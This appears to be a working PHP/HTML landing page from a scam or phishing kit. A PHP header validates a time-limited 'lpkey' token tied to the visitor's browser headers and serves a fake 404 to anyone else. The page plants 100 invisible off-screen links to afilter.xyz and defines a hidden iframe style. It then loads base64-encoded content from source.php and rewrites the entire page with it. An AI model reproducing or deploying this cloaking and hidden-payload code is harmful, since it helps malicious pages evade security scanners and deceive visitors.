<?php $e='102f1b4cbe3ec40b31ee317ee70c3f93';$f='404';$g=@$_GET["lpkey"];date_default_timezone_set('Asia/Shanghai');$h=substr($g,0,2).substr($g,4,2).substr($g,8,2).substr($g,12,2).substr($g,16,2);$i=substr($g,2,2).substr($g,6,2).substr($g,10,2).substr($g,14,2);$j=md5($e.$_SERVER['HTTP_ACCEPT_LANGUAGE'].$_SERVER["HTTP_USER_AGENT"].$h);$j=substr($j,2,2).substr($j,7,2).substr($j,12,2).substr($j,24,2);if(time()>$h||$j!==$i||!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){if($f=='404')Header("HTTP/1.1 404 Not Found");else{header('HTTP/1.1 301 Moved Permanently');header('Location: '.$k);}die();}?>
<!DOCTYPE html>
<head>
    <meta charset="utf-8">
    <title></title>
    <script src="js/zepto.min.js"></script>
    <script src="js/base64.min.js"></script>
    <style>iframe {
            visibility: hidden;
            position: absolute;
            left: 0; top: 0;
            height:0; width:0;
            border: none;
        }</style>
</head>
<body>

<?php for ($i = 0; $i < 100; $i++) { ?>
    <a href="https://afilter.xyz/d/<?php echo session_create_id() ?>" style="position: absolute; left: -100px;">Check
        Now</a>
<?php } ?>

<script>
    function b64DecodeUnicode(str) {
        return decodeURIComponent(atob(str).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }

    $.ajax({
        type: 'GET',
        url: "source.php",
        cache: false,
        data: {
            v: getQueryString("v")
        },
        success: function (data) {
            var doc = document.open('text/html', 'replace');
            var dat = b64DecodeUnicode(data);
            doc.write(dat);
            doc.close();
        },
        error: function () {

        }
    });

    function getQueryString(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return unescape(r[2]);
        }
        return null;
    }
</script>
</body>
</html>
        